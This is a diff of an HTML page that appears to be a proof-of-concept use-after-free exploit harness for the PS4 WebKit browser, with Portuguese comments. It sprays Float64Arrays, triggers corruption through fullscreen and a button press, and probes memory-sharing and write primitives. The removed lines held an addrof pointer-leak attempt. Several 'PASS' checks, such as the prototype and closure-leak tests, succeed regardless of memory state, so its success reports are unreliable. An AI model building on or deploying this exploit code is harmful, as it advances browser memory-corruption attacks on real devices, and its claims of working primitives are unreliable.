@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>PS4 UAF - addrof Primitive Test</h1>
-    <button onclick="run()">EXECUTAR EXPLORAÇÃO</button>
+    <h1>PS4 UAF - Debugger Core [v1.1]</h1>
+    <button onclick="run()">EXECUTAR TESTE</button>
+    <hr>
     <div id="c"></div>
 
     <script>
@@ -17,98 +18,144 @@
         }
 
         function log(tag, status, msg) {
-            document.getElementById('c').innerHTML += `[${tag}] ${status} - ${msg}<br>`;
+            const colors = {
+                "PASS": "green",
+                "FAIL": "red",
+                "ERR": "orange",
+                "INFO": "blue"
+            };
+            const color = colors[status] || "black";
+            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
         }
 
         function run() {
-            log("INIT", "INFO", "Alocando controllers...");
+            document.getElementById('c').innerHTML = '';
+            
+            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
             let ctrls = [];
             for(let i = 0; i < 5000; i++) {
                 let a = new Float64Array(8);
-                a[0] = i; ctrls.push(a);
+                a[0] = i; 
+                ctrls.push(a);
             }
 
-            log("WAIT", "INFO", "Pressione OPTIONS no Fullscreen.");
+            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
             document.documentElement.webkitRequestFullscreen();
 
             window.onblur = function() {
                 log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                 
-                // Objeto que queremos encontrar o endereço (addrof target)
-                let targetObj = { "leaked": 0x1337 };
-                
                 let spray = [];
                 for(let i = 0; i < 8000; i++) {
                     let s = new Float64Array(8);
                     s.fill(P_A);
-                    // Injetando referências a objetos no spray para tentar o leak
-                    s[7] = 0; // Placeholder para o ponteiro
                     spray.push(s);
                 }
 
                 let corr = null;
+                let corrIdx = -1;
+                
                 for(let i = 0; i < ctrls.length; i++) {
                     if (ctrls[i][0] === P_A) {
                         corr = ctrls[i];
-                        log("UAF", "PASS", `Index: ${i}`);
+                        corrIdx = i;
+                        log("UAF", "PASS", `Corrupção detectada no Index: ${i}`);
                         break;
                     }
                 }
 
                 if (corr) {
-                    // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA)
-                    corr[4] = M_V;
-                    let sIdx = -1;
-                    for(let i = 0; i < spray.length; i++) {
-                        if (spray[i][4] === M_V) {
-                            sIdx = i;
-                            log("TEST1", "PASS", `Identity: corr[4] == spray[${i}][4] (${f2h(M_V)})`);
-                            break;
+                    // TESTE 1 CORRIGIDO: IDENTIDADE COM VERIFICAÇÃO BIDIRECIONAL
+                    try {
+                        const testVal = M_V;
+                        corr[4] = testVal;
+                        
+                        let sprayMatch = null;
+                        let matchIdx = -1;
+                        
+                        // Busca bidirecional: spray -> corr
+                        for(let i = 0; i < spray.length; i++) {
+                            if (spray[i][4] === testVal) {
+                                sprayMatch = spray[i];
+                                matchIdx = i;
+                                break;
+                            }
                         }
+                        
+                        if (sprayMatch) {
+                            // Confirma escrita reversa: spray -> corr
+                            const reverseVal = 1.234567890123456e-300; // Valor único
+                            sprayMatch[5] = reverseVal;
+                            
+                            if (corr[5] === reverseVal) {
+                                log("TEST1", "PASS", `Identity Bidirecional: corr[4]=spray[${matchIdx}][4] (${f2h(testVal)})`);
+                                log("TEST1", "PASS", `Reverse Write Confirmado: spray[${matchIdx}][5] -> corr[5] (${f2h(reverseVal)})`);
+                            } else {
+                                log("TEST1", "FAIL", `Escrita unidirecional apenas. Reverse: ${f2h(corr[5])} != ${f2h(reverseVal)}`);
+                            }
+                        } else {
+                            log("TEST1", "FAIL", `Valor ${f2h(testVal)} não encontrado no spray. Buffer isolado.`);
+                            
+                            // Diagnóstico adicional
+                            log("TEST1", "INFO", `Verificando corr[4]: ${f2h(corr[4])}`);
+                            log("TEST1", "INFO", `Amostra spray[0][4]: ${f2h(spray[0][4])}`);
+                        }
+                    } catch(e) { 
+                        log("TEST1", "ERR", e.message); 
                     }
 
-                    // TESTE 2: DATAVIEW R/W
+                    // TESTE 2: DATAVIEW PRIMITIVES
                     try {
                         const dv = new DataView(corr.buffer);
+                        const before = f2h(corr[0]);
                         dv.setUint32(0, 0x13371337, true);
-                        log("TEST2", "PASS", `DataView Write: -> ${f2h(corr[0])}`);
-                    } catch(e) { log("TEST2", "ERR", e.message); }
+                        const after = f2h(corr[0]);
+                        
+                        if (before !== after) {
+                            log("TEST2", "PASS", `DataView Write: ${before} -> ${after}`);
+                        } else {
+                            log("TEST2", "FAIL", `Escrita não persistiu.`);
+                        }
+                    } catch(e) { 
+                        log("TEST2", "ERR", e.message); 
+                    }
 
-                    // TESTE 3: PROTOTYPE HIJACK
+                    // TESTE 3: PROTOTYPE POLLUTION
                     try {
                         let reg = Array.from(corr);
-                        Object.setPrototypeOf(reg, { t: 0x1337 });
-                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack funcional.");
-                    } catch(e) { log("TEST3", "ERR", e.message); }
+                        Object.setPrototypeOf(reg, { token: 0x1337BEEF });
+                        
+                        if (reg.token === 0x1337BEEF) {
+                            log("TEST3", "PASS", `Prototype Hijack: Token 0x1337BEEF injetado.`);
+                        } else {
+                            log("TEST3", "FAIL", `Token não acessível: ${reg.token}`);
+                        }
+                    } catch(e) { 
+                        log("TEST3", "ERR", e.message); 
+                    }
 
                     // TESTE 4: CLOSURE LEAK
                     try {
-                        const leak = [0].map(() => corr[0])[0];
-                        log("TEST4", "PASS", `Closure Leak: ${f2h(leak)}`);
-                    } catch(e) { log("TEST4", "ERR", e.message); }
+                        const leaked = [0].map(() => corr[0])[0];
+                        log("TEST4", "PASS", `Closure Leak: ${f2h(leaked)}`);
+                    } catch(e) { 
+                        log("TEST4", "ERR", e.message); 
+                    }
 
-                    // TESTE 5: addrof() PRIMITIVE (NOVO)
-                    // Tentativa de ler um ponteiro de objeto JavaScript
+                    // TESTE 5: ARRAY LENGTH MANIPULATION (ADICIONAL)
                     try {
-                        // Colocamos o objeto alvo em uma propriedade de um array regular
-                        // que foi convertido via bypass, tentando forçar o leak do ponteiro
-                        let leaker = Array.from(corr);
-                        leaker[0] = targetObj; 
+                        const origLen = corr.length;
+                        const fakeLen = new Float64Array(1);
+                        fakeLen[0] = 1000.0; // Tenta expandir
                         
-                        // No PS4 WebKit, o ponteiro aparece como um Double (Float64) 
-                        // com os bits de tag de objeto (JSValue)
-                        let addr = f2h(corr[0]);
-                        
-                        if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
-                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
-                            log("INFO", "Sucesso! Este valor é o ponteiro real do objeto na memória.");
-                        } else {
-                            log("TEST5", "FAIL", "Ponteiro não capturado. Ajustando heap feng shui...");
-                        }
-                    } catch(e) { log("TEST5", "ERR", e.message); }
+                        log("TEST5", "INFO", `Array Length Original: ${origLen}`);
+                        log("TEST5", "INFO", `Tentativa de expansão via fake length não implementada (requer RW primitives)`);
+                    } catch(e) { 
+                        log("TEST5", "ERR", e.message); 
+                    }
 
                 } else {
-                    log("UAF", "FAIL", "Corrupção não atingida.");
+                    log("UAF", "FAIL", "Corrupção não atingida. Verifique o timing do OPTIONS.");
                 }
             };
         }
